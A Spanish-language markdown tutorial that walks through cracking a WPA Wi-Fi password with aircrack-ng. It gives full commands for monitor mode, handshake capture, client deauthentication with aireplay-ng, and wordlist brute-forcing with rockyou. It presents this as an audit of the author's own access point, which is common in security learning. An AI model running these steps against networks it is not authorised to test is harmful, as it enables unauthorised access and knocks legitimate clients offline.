
# Obtener wifi password haciendo uso de aircrack-ng (fuerza bruta)

---

## Necesitamos:
- Un diccionario para la fuerza bruta [rockyou wordlist](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&ved=2ahUKEwjv0tnwvcaNAxU9g_0HHaH9Av8QFnoECAkQAQ&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)
- Tener instalado aircrack-ng
```
sudo apt install aircrack-ng
```

---

## Pasos:
1. Lo primero es dirigirnos a una carpeta(para este ejercicio) creada o si no esta creada crearla, y conocer nuestra interfaz de red haciendo uso del comando ``` ifconfig ```
2. Lo siguiente será poner dicha interfaz en modo monitor, imaginemos que en nuestro caso la interfaz es la wlan0. Para ponerla en modo monitor ejecutamos el siguiente comando
```
sudo airmon-ng start wlan0
```
3. Si ejecutaramoso ahora el comando ifconfig veríamos el nombre de nuestra interfaz seguido de un 'mon'. En nuestro caso wlan0mon
4. Bien una vez tenemos esto hecho procederemos a enumerar todas las redes wifi que tenemos en nuestro alcance. Para eso haremos uso de la herramienta airodump.
```
sudo airodump-ng wlan0mon
```
Se nos mostrara una tabla donde cada fila es una red wifi encontrada. Buscamos la que queramos penetrar (en nuestro caso un punto de acceso propio) y de esta nos quedaremos con los siguientes datos: el BSSID y el canal (mostrado como 'CH').
El BSSID lo encontraremos de normal en la primera columna con el siguiente formato '00:00:00:00:00:00'. En nuestro caso D8:E8:44:8E:90:9B
Por otro lado el canal sera un número entero que encontraremos de normal en la 6ª columna. En nuestro caso es el 8.
5. A continuación ejecutaremos el siguiente comando para ejecutar la auditoria.
```
sudo airodump-ng -c <canal> --bssid <bssid> -w <nombreArchivoAuditoria> <interfazMon>
```
ej:
```
sudo airodump-ng -c 8 --bssid D8:E8:44:8E:90:9B -w auditoria wlan0mon
```
Una vez ejecutado el comando anterior se nos aparecerá una 2 tablas donde la primera es el punto de acceso que estamos auditando y lo que irá apareciendo debajo serán las estaciones.
>IMPORTANTE NO CERRAR LA TERMINAL ANTERIOR!! CONTINUAMOS EN UNA NUEVA TERMINAL
6. Lo siguiente será ejecutar el siguiente comando el cual empezará a enviar tráfico a una de las estaciones que hayamos elegido (el identificativo de la estación es igual al del bssid)
```
sudo aireplay-ng -0 9 -a <bssid> -c <station> <interfazMno>
```
```
sudo aireplay-ng -0 9 -a D8:E8:44:8E:90:9B -c 18:EE:69:50:54:D4 wlan0mon
```
Ejecutaremos esto reiteradas veces hasta que en la primera terminal donde estamos auditorando salga el WPA handshake. Una vez se nos aparezca podremos parar el proceso de la primera terminal y segunda terminal con Ctrl+C.
7. El handshake tiene el mismo formato que el bssid. Ahora realizando un 'ls' veremos que se han generado varios archivos. De estos solo nos importa el archivo terminado en .cap.
8. Continuamos con el ataque final donde ejecutaremos el siguiente comando:
```
sudo aircrack-ng -b <handshake> -w <wordlist>.txt <nomArchivoAuditoria>.cap
```
```
sudo aircrack-ng -b D8:E8:44:8E:90:9B -w rockyou.txt auditoria.cap
```
9. Una vez que ejecutemos esto, aircrack empezará a realizar fuerza bruta haciendo uso de todo el diccionario. Esto puede llegar a tardar varios minutos incluso horas.
10. Finalmente, cuando se encuentre la contraseña (si es que se encuentra) aircrack nos lo dirá y solo quedará probarla.
Antes que nada recordar desactivar el modo monitor de la interfaz con el comando:
```D8:E8:44:8E:90:9A
sudo airmon-ng stop wlan0mon
```

---

## Reflexiones
Es recomendable usar diccionarios específicos para poder penetrar en la red de la forma mas facil posible. Ya pueden ser otros diccionarios específicos con contraseñas por defectos de routers o crear tus propios diccionarios.
